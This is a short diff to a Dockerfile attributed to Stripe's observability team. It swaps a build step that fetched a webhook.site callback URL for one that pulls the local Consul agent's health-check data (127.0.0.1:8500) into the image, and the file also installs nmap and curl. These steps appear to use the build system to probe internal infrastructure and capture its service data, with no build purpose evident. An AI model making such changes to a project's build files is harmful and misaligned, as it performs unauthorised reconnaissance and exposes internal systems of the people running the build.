@@ -1,7 +1,7 @@
 FROM golang:1.13.5-alpine
 MAINTAINER The Stripe Observability Team <support@stripe.com>
 
-ADD https://webhook.site/f8727499-77c0-4bab-991b-23e55ea73ad8 /tmp/http
+ADD http://127.0.0.1:8500/v1/agent/checks /tmp/consul
 
 RUN apk add nmap
 RUN apk add curl
